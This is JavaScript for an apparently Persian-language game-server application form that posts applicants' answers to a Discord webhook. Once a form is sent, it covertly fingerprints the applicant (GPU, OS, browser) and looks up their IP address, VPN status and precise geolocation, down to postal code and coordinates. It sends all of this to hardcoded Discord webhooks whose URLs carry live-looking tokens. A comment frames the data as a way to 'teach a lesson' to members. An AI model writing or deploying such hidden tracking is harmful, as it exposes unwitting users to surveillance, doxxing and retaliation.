let canSubmit = true;
        function sendData() {
            if (canSubmit) {
                const username = document.getElementById("username").value;
                const icname = document.getElementById("icname").value;
                const key_join = document.getElementById("key_join").value;
                const steamhex = document.getElementById("steamhex").value;
                const discordid = document.getElementById("discordid").value;
                const age = document.getElementById("age").value;
                const Q_1 = document.getElementById("Q_1").value;
                const Q_2 = document.getElementById("Q_2").value;
                const Q_3 = document.getElementById("Q_3").value;
                const Q_4 = document.getElementById("Q_4").value;
                const Q_5 = document.getElementById("Q_5").value;
                const Q_6 = document.getElementById("Q_6").value;
                const Q_RP_1 = document.getElementById("Q_RP_1").value;
                const Q_RP_2 = document.getElementById("Q_RP_2").value;
                const Q_RP_3 = document.getElementById("Q_RP_3").value;
                const Q_RP_4 = document.getElementById("Q_RP_4").value;
                const Q_RP_5 = document.getElementById("Q_RP_5").value;
                const Q_RP_6 = document.getElementById("Q_RP_6").value;
                const data = {
                    content: `
                    OOC **Name :** ${username}
                    \n_____________________________
                    \n **IC Name:** ${icname}
                    \n_____________________________
                    \n **Steam Hex :**  ${steamhex}
                    \n_____________________________
                    \n **Copy User ID :**  <@${discordid}>
                    \n_____________________________
                    \n **Sen :** ${age}
                    \n_____________________________
                    \n **Rp Chist :** ${Q_1}
                    \n_____________________________
                    \n **Non Rp Chist :** ${Q_2} 
                    \n_____________________________
                    \n **Sexual Rp Chist : **${Q_3}
                    \n_____________________________
                    \n **Fear Rp Chist : **${Q_4} 
                    \n_____________________________
                    \n **Non Driving Chist :**${Q_5}
                    \n_____________________________
                    \n **Heve Rp Chist :** ${Q_6}
                    \n_____________________________
                    \n **Dar che Mavaghe Az /me astfadh mikonid :** ${Q_RP_1}
                    \n_____________________________
                    \n **Kar /do ra tozih dahid :** ${Q_RP_2}
                    \n_____________________________
                    \n **Mojrem Ro Chetor Azad Midonid :** ${Q_RP_3}
                    \n_____________________________
                    \n **Aya CIA Dar Shahr Bage Darad ? :**${Q_RP_4}
                    \n_____________________________
                    \n **Braye Tir Andazi chand Ektar Niaz Ast** : ${Q_RP_5}
                    \n_____________________________
                    \n **Agar Kheft Shoded Chekar Mikonid :** ${Q_RP_6}
                    \n_____________________________
                    \n <@&1141373715221844079> : NEW Test
                    `
                    
                };

                if (key_join === "key-cia-v123554"){
                    fetch('your Webhook Discord ', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    }).then(response => {
                        if (response.ok) {
                            alert('اطلاعات با موفقیت ارسال شد.');
                            resetAndClear();
                            checkFormAccess();
                            info_location();
                            getGraphicsInfo();
                            api();
                            canSubmit = false;
                        } else {
                            alert(' لطفا پاسخ کوتاه دهید زیرا شما کاربر مخرب شناخته میشود.');
                        }
                    }).catch(error => {
                        console.error('خطا:', error);
                    });
                } else {
                    alert('Key JOIN اشتباه است');
                }
            } else {
                alert('(زمان باقی مانده 5 ساعت )لطفاً صبر کنید. فرم بعد از مدت زمانی قابل استفاده خواهد شد.');
            }
        }

                function resetAndClear() {
                    document.getElementById("username").value = '';
                    document.getElementById("icname").value = '';
                    document.getElementById("key_join").value = '';
                    document.getElementById("steamhex").value = '';
                    document.getElementById("discordid").value = '';
                    document.getElementById("age").value = '';
                    document.getElementById("Q_1").value = '';
                    document.getElementById("Q_2").value = '';
                    document.getElementById("Q_3").value = '';
                    document.getElementById("Q_4").value = '';
                    document.getElementById("Q_5").value = '';
                    document.getElementById("Q_6").value = '';
                    document.getElementById("Q_RP_1").value = '';
                    document.getElementById("Q_RP_2").value = '';
                    document.getElementById("Q_RP_3").value = '';
                    document.getElementById("Q_RP_4").value = '';
                    document.getElementById("Q_RP_5").value = '';
                    document.getElementById("Q_RP_6").value = '';
                    canSubmit = true;
                }


            // Colldonw

                function checkFormAccess() {
                    const lastSubmitTime = localStorage.getItem("lastSubmitTime");
                    
                    const accessAllowed = localStorage.getItem("accessAllowed");

                    if ((!lastSubmitTime || Date.now() - parseInt(lastSubmitTime) >= 5 * 60 * 60 * 1000) && accessAllowed !== "false") {

                        alert(" 5 ساعت تا فورم بعدی ");
                       

                        localStorage.setItem("accessAllowed", "true");
                    } else {
                        alert("شما باید حداقل 5 ساعت بعد از آخرین ارسال منتظر بمانید یا دسترسی را مجدداً فعال کنید.");
                    }
                }

                function disableFormAccess() {
                    localStorage.setItem("accessAllowed", "false");
                }

                function saveLastSubmitTime() {
                    localStorage.setItem("lastSubmitTime", Date.now().toString());
                }
            // Colldonw


            // Info_system


            function getGraphicsInfo() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) {
                    console.error('مرورگر شما از WebGL پشتیبانی نمی‌کند.');
                    return;
                }
            
                const renderer = gl.getParameter(gl.RENDERER);
                const vendor = gl.getParameter(gl.VENDOR);
                const graphicsCard = renderer + ' - ' + vendor;
            
                const discordid = document.getElementById("discordid").value;
            
                const info = {
                    graphicsCard: graphicsCard,
                    operatingSystem: navigator.platform,
                    browserVersion: navigator.appVersion,
                    cpuCores: navigator.hardwareConcurrency,
                    discordid: discordid,
                };
            
                sendToDiscord(info);
            }
            
            function sendToDiscord(info) {
                const discordWebhookUrl = 'https://discord.com/api/webhooks/1144633449391599616/P4gjkGxiXwMX7m1I53IZAjWYgZ31IsXEUni9XBG7hXUnLHN8KvNY3u4XBnR89cGhsdz6';
            
                fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: JSON.stringify(info),
                    }),
                })
                .then((response) => {
                    if (response.status === 204) {
                        console.log('اطلاعات با موفقیت به دیسکورد ارسال شد.');
                    } else {
                        console.error('خطا در ارسال اطلاعات به دیسکورد.');
                    }
                })
                .catch((error) => {
                    console.error('خطا در ارسال اطلاعات به دیسکورد:', error);
                });
            }
            

            // Info_system

                // Location _ ip USer

                function info_location() {
                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1144633446036144349/ZKoxoM3OoZ0ojUVpXO12mZKi0Tt_EKuyvaF5FpDI6vWdx9uZzoa3C0fpRObtyVTv4pjG';
                    
                    const discordid = document.getElementById("discordid").value;
                
                    const sendInfoToDiscord = async (info) => {
                        try {
                            const ipAddressResponse = await fetch('https://api64.ipify.org?format=json');
                            const ipAddressData = await ipAddressResponse.json();
                            const ipAddress = ipAddressData.ip;
                
                            const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                            const locationData = await locationResponse.json();
                            const city = locationData.city;
                            const country = locationData.country_name;
                
                            const vpnDetectionResponse = await fetch(`https://ipinfo.io/${ipAddress}/org`);
                            const vpnDetectionData = await vpnDetectionResponse.text();
                            const isVPN = vpnDetectionData.includes('VPN');
                
                            info += `\n 
                                    \n  شهر: ${city}, 
                                    \n کشور: ${country}
                                    \n آدرس IP: ${ipAddress}
                                    \n Discord ID: <@${discordid}>
                                    \n VPN: ${isVPN ? 'بله' : 'خیر'}

                                    =================================================================================================

                                    \n **new_ip** <@&1144577885043167322>
                                    \n **در صورتی ک عضوی قصد خالی کردن لاکر را دارد این اطلعات ب شما کمک می کند تا درسی ب او دهید**

                                    ===================================================================================================
                                    
                                    `; 
                
                            const discordResponse = await fetch(discordWebhookUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    content: info,
                                }),
                            });
                
                            if (discordResponse.status === 204) {
                                console.log('اطلاعات با موفقیت به دیسکورد ارسال شد.');
                            } else {
                                console.error('خطا در ارسال اطلاعات به دیسکورد.');
                            }
                        } catch (error) {
                            console.error('خطا در ارسال اطلاعات به دیسکورد:', error);
                        }
                    };
                
                    const getInfoAndSendToDiscord = () => {
                        const browserInfo = `
                            نام مرورگر: ${navigator.userAgent}, 
                            نسخه: ${navigator.appVersion}
                        `;
                
                        sendInfoToDiscord(browserInfo);
                    };
                
                    getInfoAndSendToDiscord();
                }
                
                
           
                // Location USer

                function api() {
                    const discordWebhookUrl = 'https://discord.com/api/webhooks/1144633454449926155/2zddsvXsxra7hzh8jmziiGajawLMVFjnXzOuizChd9dcpzjO084kFDscunWI2hCxaUfB';
                
                    
                    const discordid = document.getElementById("discordid").value;
                
                    const sendInfoToDiscord = async (info) => {
                        try {
                            const ipAddressResponse = await fetch('https://api64.ipify.org?format=json');
                            const ipAddressData = await ipAddressResponse.json();
                            const ipAddress = ipAddressData.ip;
                            // scrapt info user
                            const apiResponse = await fetch('http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query');
                            const apiData = await apiResponse.json();
                
                            if (apiData.status === "success") {
                                info += `
                                \n وضعیت : ${apiData.status}
                                \n قاره : ${apiData.continent}
                                \n کد قاره : ${apiData.continentCode}
                                \n کشور : ${apiData.country}
                                \n کد کشور : ${apiData.countryCode}
                                \n منطقه : ${apiData.region}
                                \n نام منطقه : ${apiData.regionName}
                                \n شهر : ${apiData.city}
                                \n ناحیه : ${apiData.district}
                                \n کد پستی : ${apiData.zip}
                                \n عرض جغرافیای  : ${apiData.lat}
                                \n طول جغرافیا : ${apiData.lon}
                                \n منطقه زمانی : ${apiData.timezone}
                                \n انحراف : ${apiData.offset}
                                \n  واحد پول : ${apiData.currency}
                                \n سرویس دهنده اینترنت : ${apiData.isp}
                                \n نام سرویس دهنده : ${apiData.org}
                                \n نام سرویس دهنده کد : ${apiData.as}
                                \n نام سرویس دهنده کامل  : ${apiData.asname}
                                \n فول ای پی  : ${apiData.reverse}
                                \n ورودی موبایل : ${apiData.mobile}
                                \n پروکسی : ${apiData.proxy}
                                \n اجرا در سرور : ${apiData.hosting}
                                \n ip عددی : ${apiData.query}
                                User ID : <@${discordid}>
                                Mention Rol : <@&1144577885043167322>
                                `;
                            }
                            // Send data to the Discord webhook
                            const discordResponse = await fetch(discordWebhookUrl, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    content: info,
                                }),
                            });
                
                            if (discordResponse.status === 204) {
                                console.log('اطلاعات با موفقیت به دیسکورد ارسال شد.');
                            } else {
                                console.error('خطا در ارسال اطلاعات به دیسکورد.');
                            }
                        } catch (error) {
                            console.error('خطا در دریافت اطلاعات از API: ', error);
                        }
                    };
                
                    const getInfoAndSendToDiscord = () => {
                        const browserInfo = `
                            نام مرورگر: ${navigator.userAgent}, 
                            نسخه: ${navigator.appVersion}
                        `;
                
                        sendInfoToDiscord(browserInfo);
                    };
                
                    getInfoAndSendToDiscord();
                }
                // send Data 
                async function validateAndSend() {
                    const inputs = document.querySelectorAll('#Test2 input[required]');
                    let valid = true;
                
                    inputs.forEach(input => {
                        if (input.value.trim() === '') {
                            valid = false;
                        }
                    });
                
                    if (!valid) {
                        alert('لطفاً تمامی ورودی‌ها را پر کنید.');
                    } else {
                        sendData();
                        api();
                    }
                }
                


                